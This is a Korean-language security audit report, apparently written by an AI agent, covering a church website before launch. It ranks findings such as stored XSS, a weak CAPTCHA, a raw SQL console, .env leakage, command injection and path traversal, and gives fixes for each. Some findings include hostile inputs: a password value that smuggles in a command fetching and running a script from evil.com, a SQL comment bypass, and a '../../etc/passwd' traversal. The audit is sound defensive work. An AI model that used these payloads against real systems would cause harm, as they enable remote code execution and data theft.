# Security Audit — 동천교회 홈페이지 (출시 전)

**감사일**: 2026-04-13
**감사팀**: Security Auditor (Agent)
**범위**: 인증/인가, 주입 공격, CSRF, 파일 업로드, 세션 관리, 민감정보 노출

---

## 종합 평가

세션 인증, bcrypt, 이메일 인증, CAPTCHA 등 기본 구조는 양호하나 **출시 전 반드시 수정해야 할 CRITICAL/HIGH 이슈가 다수** 존재합니다. 원시 SQL 실행 경로, XSS, 비밀 노출, 쿠키 플래그, 누락된 권한 체크가 핵심 문제입니다.

---

## CRITICAL (출시 블로커)

### C1. 게시판 게시글·댓글·공지·도움말 위젯의 Stored XSS
- **파일**:
  - `src/app/board/[boardId]/[postId]/page.tsx:185-292`
  - `src/components/board/CommentSection.tsx:359`
  - `src/app/page.tsx:355`
  - `src/components/layout/Header.tsx:86,198`
  - `src/components/HelpButton.tsx:78`
- **문제**: 모든 출력이 `dangerouslySetInnerHTML`로 렌더링되면서 sanitization이 전혀 없음. `useHtml=true`가 새 게시판의 기본값(`admin/boards/route.ts:63`)이라 로그인된 누구나 `<script>`, `<iframe>`, `<img onerror>`, 가짜 로그인 폼 등 임의의 HTML 삽입 가능. 댓글은 비로그인자도 작성 가능하여 익명으로도 공격 경로 열림.
- **영향**: 관리자가 해당 글을 조회할 때 악성 스크립트가 같은 오리진에서 `/api/admin/*`를 호출 → 관리자 권한 탈취, 사이트 변조, 피싱 주입.
- **권장 수정**: `isomorphic-dompurify`(또는 `sanitize-html`) 도입 후 strict allow-list(p/br/strong/em/a[href]/img[src]/ul/ol/li/blockquote)만 허용. 댓글은 plain text + `\n → <br>`으로 제한.

### C2. CAPTCHA 기본 시크릿 하드코딩 + 문제=답 구조
- **파일**: `src/lib/captcha.ts:3,7-9`
- **문제**: `const code = String(Math.floor(1000 + Math.random() * 9000));` → `question = code`로 응답 payload에 정답이 그대로 노출. 게다가 `CAPTCHA_SECRET` 미설정 시 `"dc-church-captcha-2024"`를 fallback 사용 → 공격자가 오프라인으로 토큰 위조 가능.
- **영향**: CAPTCHA가 봇 방지 기능을 전혀 수행하지 않음.
- **권장 수정**: 시크릿 미설정 시 startup에서 throw. 연산식 기반 문제(`3 + 5 = ?`)로 교체하고 정답을 응답에 노출하지 않도록 함. 가능하다면 Turnstile/hCaptcha 도입.

### C3. 관리자 SQL 콘솔 — 원시 SQL 임의 실행
- **파일**: `src/app/api/admin/db/sql/route.ts:221-297` (및 `db/migrate`, `db/import`)
- **문제**: 정규식 블랙리스트(`DROP DATABASE`, `GRANT`, `LOAD DATA`, `INTO OUTFILE`…)는 주석 삽입으로 우회 가능 (`DROP/**/DATABASE foo`). `UPDATE users SET password='...' WHERE isAdmin=1`은 차단되지 않음 → 관리자 세션이 한 번만 탈취되면 전체 DB 쓰기 가능.
- **권장 수정**: 프로덕션 빌드에서 SQL 콘솔을 비활성화(`NODE_ENV !== "production"` 또는 별도 env flag). 유지 시 재인증 + TOTP 필수, 모든 쿼리 로깅.

### C4. `.env` 누출 + 비밀번호 해시 콘솔 로그
- **파일**:
  - `src/app/api/admin/backup/route.ts:141-146`(소스 백업 ZIP에 `.env` 포함)
  - `src/app/api/auth/login/route.ts:20-22`(bcrypt 해시 prefix 로그)
  - `src/app/api/auth/reset-password/confirm/route.ts:46,67-71`
- **문제**: 관리자 권한만 있으면 `.env`(DB 자격증명, SMTP PW, NEXTAUTH_SECRET, CAPTCHA_SECRET) 통째로 다운로드 가능. 로그인 시마다 해시 일부가 PM2 stdout에 기록되어 로그 접근자에게 노출.
- **권장 수정**: 백업에서 `.env*` 제외. 모든 비밀번호/해시/이메일 관련 `console.log` 제거.

### C5. FTP 백업·mysqldump 명령 인젝션
- **파일**: `src/app/api/admin/backup/ftp/route.ts:87`, `src/app/api/admin/backup/route.ts:223`
- **문제**: `execSync(\`curl -T "${localPath}" "${remoteUrl}" --user "${ftp.user}:${ftp.password}"\`)` — FTP 자격증명을 DB에서 읽어 쉘 문자열로 보간. 관리자가 `ftp_password = "x\" $(curl evil.com/rce.sh | sh) \""`로 설정하면 다음 백업 시 RCE.
- **권장 수정**: `execFile`/`spawn` + argv 배열. 비밀번호는 `MYSQL_PWD` env 또는 `--defaults-file` 사용.

### C6. 이관회원 migration-login 계정 탈취 (원래 H5 → CRITICAL 승격)
- **파일**: `src/app/api/auth/migration-login/route.ts:25-37`
- **문제**: `userId`만 알면 **레거시 비밀번호 검증 없이** 임의의 새 비밀번호를 설정 가능. 레거시 회원의 옛 userId는 이관된 게시글 authorName 등으로 쉽게 노출됨.
- **권장 수정**: `verifyPassword()`가 이미 레거시 해시를 지원하므로 **이 API를 삭제**하고 일반 로그인으로 통합 (옵션 A). 또는 기존 비밀번호를 입력받아 검증 후에만 새 비밀번호 설정 허용.

---

## HIGH

### H1. 쿠키 `secure` 플래그가 SITE_URL 접두사에만 의존
- `src/app/api/auth/login/route.ts:52-56` — `secure: (process.env.SITE_URL || "").startsWith("https")`. 프로덕션에서 SITE_URL 미설정 시 쿠키가 HTTP에서도 전송됨(MITM 탈취 가능).
- **수정**: `secure: process.env.NODE_ENV === "production"` 하드코딩 또는 startup 검증.

### H2. CSRF 보호 전무
- 모든 POST/PUT/DELETE 엔드포인트에 CSRF 토큰 검사 없음. 쿠키 SameSite=lax만 의존 → 동일 사이트 XSS와 결합 시 관리자 API 무차별 호출 가능.
- **수정**: Double-submit CSRF 토큰 (`dc_csrf` non-HttpOnly 쿠키 + `x-csrf-token` 헤더 검증) 미들웨어화.

### H3. Path Traversal (다운로드/이미지 경로)
- `src/app/api/download/route.ts:29-30`, `src/app/api/council/files/download/route.ts:25-26`, `src/app/api/image/route.ts:42`
- DB에 `../../etc/passwd` 같은 값이 들어가면 그대로 서빙.
- **수정**: `path.resolve` 후 `allowedRoot.startsWith` 검증 헬퍼 공유.

### H4. 업로드 확장자/크기/콘텐츠 검증 없음
- `src/app/api/board/write/route.ts:95-111` — 로그인·CAPTCHA 통과자가 `.phtml`, `.svg`(XSS), `.html` 임의 업로드 가능. `board.maxUploadSize`도 실제로 비교 안 됨.
- **수정**: 확장자 화이트리스트(jpg/png/pdf/hwp/docx/xlsx/zip). `.svg, .html, .js, .php` 블랙리스트. `Content-Disposition: attachment` + `X-Content-Type-Options: nosniff`.

### H5. migration-login은 C6로 승격 — 위 참조

### H6. 인증 관련 엔드포인트 Rate limiting 전무
- login/register/password-reset/captcha/migration-login 전부 제한 없음. 4자 비밀번호 정책과 결합하면 무차별 대입 수초.
- **수정**: IP + userId 기준 슬라이딩 윈도우 제한, 8자 이상 + 복잡성 규칙.

### H7. 전표번호 생성 경합 (데이터 무결성)
- `src/app/api/accounting/vouchers/route.ts:35-54` — 비트랜잭션 read-compute-insert. 동시 POST 시 `@@unique([unitId, voucherNo])` 충돌로 500 또는 드물게 중복 데이터.
- **수정**: `$transaction` + `SELECT FOR UPDATE`, 또는 P2002 retry.

---

## MEDIUM

- **M1**: 모든 비밀번호 정책 최소 길이 4 → 8자 이상으로 상향.
- **M2**: 로그인된 사용자가 글 작성해도 bcrypt(12) 해시 실행(`write/route.ts:79`) → DoS 벡터. 비로그인 시에만 해시.
- **M3**: 관리자 게시판 API에서 `grantXxx` 값 서버측 clamp 없음.
- **M4**: 회계 엔드포인트들이 unitId 사용자 접근 검증 없이 신뢰.
- **M5**: 이메일 인증 토큰 원자적 소비 없음 (findFirst → update).
- **M6**: Motto HTML이 Header에 렌더링됨 → 역시 sanitize 필요.
- **M7**: `council/reading/upload` 파일 크기 1GB 허용 → 디스크 소진 DoS.
- **M8**: `admin/db/import`가 사용자 지정 DB 호스트로 연결 (SSRF-like).

## LOW

- CAPTCHA HMAC 비교가 timing-unsafe (`===`). `crypto.timingSafeEqual` 사용.
- `site_settings`에 긴 문자열 저장 허용 → 길이 제한 필요.
- 비회원 글의 email/homepage가 공개 응답에 포함됨 (PII 노출).
- Board.guideText가 렌더링 시 sanitize 없음.
- 세션 로테이션이 권한 변경/암호 변경 시에 항상 갱신되지 않음.

---

## 출시 전 권장 수정 순서

1. **C6** — migration-login 제거 or 레거시 검증 추가 (1시간)
2. **C1 + M6 + Board.guideText** — DOMPurify 도입 + `useHtml` 기본값 false (반나절)
3. **C4** — `.env` 백업 제외 + credential 로그 제거 (10분)
4. **C3** — SQL 콘솔 프로덕션 차단 (5분)
5. **C5** — execFile + argv (30분)
6. **H1** — secure 플래그 하드코딩 (1분)
7. **H2** — CSRF 미들웨어 (반나절)
8. **H3** — path traversal helper (공통 유틸)
9. **H4** — 업로드 검증
10. **H6** — 인증 rate limit
11. **M1** — 비밀번호 최소 8자
12. **C2** — CAPTCHA 교체

이 순서대로 작업하면 1–6까지만 끝내도 출시 가능 수준. 7–12는 첫 주 내 완료 권장.
